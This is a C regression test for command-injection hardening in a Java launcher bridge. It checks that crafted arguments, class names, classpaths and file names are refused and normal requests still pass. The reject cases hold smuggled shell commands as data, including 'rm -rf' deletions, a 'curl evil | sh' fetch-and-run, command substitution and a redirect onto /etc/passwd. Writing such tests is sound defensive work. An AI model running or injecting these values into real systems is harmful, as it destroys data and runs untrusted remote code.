/*
 * Regression tests for command-injection hardening in
 * sleela_java_runtime_bridge_prepare().
 *
 * Each "reject" case is an input a simple-but-clever user could supply that,
 * before hardening, would have been concatenated verbatim into plan->command
 * and could inject a second command or a crafted extra argument once a
 * launcher consumed the string. Each "accept" case is a legitimate request
 * that must still succeed.
 */
#include "../java_runtime_bridge.h"

#include <stdio.h>
#include <string.h>

static int failures = 0;

static SleelaJavaProgramRequest base_request(void) {
    SleelaJavaProgramRequest r;
    memset(&r, 0, sizeof(r));
    r.java_executable = "/usr/bin/java";   /* explicit path */
    r.classpath = ".";
    r.main_class = "App";
    r.source_file = NULL;
    r.program_arguments = NULL;
    r.sample_input = NULL;
    return r;
}

static void expect_reject(const char *label, SleelaJavaProgramRequest r) {
    SleelaJavaProgramPlan plan;
    int rc = sleela_java_runtime_bridge_prepare(&r, &plan);
    if (rc == 0) {
        printf("FAIL [reject] %s -> accepted, command=\"%s\"\n", label, plan.command);
        ++failures;
    } else {
        printf("ok   [reject] %s\n", label);
    }
}

static void expect_accept(const char *label, SleelaJavaProgramRequest r) {
    SleelaJavaProgramPlan plan;
    int rc = sleela_java_runtime_bridge_prepare(&r, &plan);
    if (rc != 0 || !plan.ready) {
        printf("FAIL [accept] %s -> rejected (rc=%d)\n", label, rc);
        ++failures;
    } else {
        printf("ok   [accept] %s -> \"%s\"\n", label, plan.command);
    }
}

int main(void) {
    SleelaJavaProgramRequest r;

    /* --- injection attempts that must be refused --- */
    r = base_request(); r.program_arguments = "x; rm -rf ~";
    expect_reject("args: semicolon chain", r);

    r = base_request(); r.program_arguments = "x && curl evil | sh";
    expect_reject("args: && and pipe", r);

    r = base_request(); r.program_arguments = "x\nrm -rf /";
    expect_reject("args: embedded newline", r);

    r = base_request(); r.program_arguments = "$(whoami)";
    expect_reject("args: command substitution", r);

    r = base_request(); r.program_arguments = "`id`";
    expect_reject("args: backtick substitution", r);

    r = base_request(); r.main_class = "App; evil";
    expect_reject("main_class: semicolon", r);

    r = base_request(); r.main_class = "App -Xbogus";
    expect_reject("main_class: embedded space (arg injection)", r);

    r = base_request(); r.classpath = ".:/tmp/$(id)";
    expect_reject("classpath: substitution", r);

    r = base_request(); r.classpath = ". -cp /evil";
    expect_reject("classpath: space (arg injection)", r);

    r = base_request(); r.source_file = "a.java > /etc/passwd";
    expect_reject("source_file: redirect", r);

    r = base_request(); r.java_executable = "java";
    expect_reject("executable: bare name (PATH redirect)", r);

    /* --- legitimate requests that must still succeed --- */
    r = base_request();
    expect_accept("plain main class", r);

    r = base_request(); r.program_arguments = "input.txt 42 verbose";
    expect_accept("normal space-separated args", r);

    r = base_request(); r.main_class = NULL; r.source_file = "/work/Hello.java";
    expect_accept("source-file launch", r);

    r = base_request(); r.classpath = "/opt/app/lib.jar"; r.main_class = "com.example.Main";
    expect_accept("qualified main class + jar classpath", r);

    if (failures) {
        printf("\n%d test(s) FAILED\n", failures);
        return 1;
    }
    printf("\nall java-bridge injection tests passed\n");
    return 0;
}
